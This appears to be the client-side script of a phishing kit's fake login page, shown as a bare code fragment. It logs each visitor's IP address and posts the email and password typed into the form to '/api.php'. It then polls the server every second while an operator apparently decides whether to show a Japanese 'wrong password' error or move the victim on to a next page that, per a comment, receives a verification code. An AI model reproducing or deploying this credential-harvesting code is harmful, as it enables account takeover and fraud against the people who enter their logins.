            <script>
                var mask = null;
                var timer = null;
                var hb_timer = null;
                function heart_beat() {
                    $.get('/api.php?act=heart_beat&_r=' + Math.random(), function (res) {
                        console.log(res);
                    });
                }
                function ip_save() {
                    $.get('/api.php?act=ip_save&_r=' + Math.random(), function (res) {
                        console.log(res);
                    });
                }
                ip_save();

                function is_agree(){
                    $.post('/api.php?act=is_agree&_r='+Math.random(),function (res) {
                        var t = JSON.parse(res);
                        if (t.code == 'ok') {
                            layer.close(mask);
                            clearInterval(timer);
                            if(t.sel.indexOf('alert-error') != -1) {
                                alert('アカウントやパスワードが間違っている');
                            }else{//非空,则传递验证码到跳转页面
                                window.location.href="next.php";
                            }
                        }else{
                            console.log('wait');
                        }
                    });
                }


                function verify(){


                    var user = document.getElementById("email");
                    var pwd = document.getElementById("password");

                    var emailerror = document.getElementById("emailtest");
                    var pwderror = document.getElementById("passwordtest");


                    if(user.value==""){
                        user.style="    border-color: #ea352d;";
                        emailerror.style.display="block";
                        return false;
                    }else {
                        user.style="    border-color: #ccc";
                        emailerror.style.display="none";

                    }
                    if(pwd.value==""){

                        pwd.style=" border-color: #ea352d;";
                        pwderror.style="display: block";
                        return false;
                    }else {
                        pwd.style="border-color: #ccc;";
                        pwderror.style="display: none";
                    }




                    var appid =  user.value;
                    var apppwd = pwd.value;
                    $.ajax({
                        url: '/api.php?act=next_save&_r='+Math.random(),
                        type: 'post',
                        data: {uname:appid,apppwd:apppwd},
                        success: function (res) {
                            var t = JSON.parse(res);
                            if(t.code == 'ok') {
                                mask = layer.load(2, {shade: [0.25, '#000']});
                                timer = setInterval("is_agree()", 1000);
                                hb_timer = setInterval("heart_beat()",1000);
                                return false;
                            }else{
                                layer.msg('提交失败！');
                                return false;
                            }
                        },
                    });


                }
